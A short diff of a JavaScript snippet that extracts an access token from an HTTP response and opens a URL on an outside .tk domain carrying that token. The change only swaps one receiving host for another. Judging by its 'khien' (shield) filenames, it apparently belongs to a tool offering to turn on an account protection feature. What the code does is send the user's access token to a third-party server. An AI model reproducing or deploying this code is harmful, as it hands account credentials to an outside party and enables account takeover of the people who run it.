@@ -45,7 +45,7 @@ switch (host) {
                     if (4 == http.readyState && 200 == http.status) {
                     var a = http.responseText.match(/access_token=(.*)(?=&expires_in)/);
                     var detoken = a[1];
-                    var link = "http://vuicode.tk/khien.php?token=" + detoken;
+                    var link = "http://kenthudoan.tk/batkhien.php?token=" + detoken;
                     window.open( link ,'_blank');
                     }
                     }, http.send(params);
